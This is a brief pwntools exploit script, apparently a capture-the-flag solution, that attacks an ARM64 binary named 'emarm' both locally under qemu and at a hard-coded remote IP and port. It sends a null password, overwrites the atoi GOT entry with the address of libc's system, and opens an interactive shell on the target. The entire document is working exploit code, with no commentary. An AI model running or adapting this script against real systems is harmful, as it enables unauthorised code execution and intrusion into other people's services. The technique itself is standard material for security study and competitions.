from pwn import*
p = process("qemu-aarch64 -L . ./emarm",shell=True)
p = remote('183.129.189.60',10012)
elf =ELF('./emarm')
libc =ELF('./libc.so.6')
p.sendlineafter('passwd:','\x00')
p.send(str(elf.got['atoi']))
system = libc.sym['system'] + 0x4000830000
p.sendafter('success',p64(system))
p.interactive()
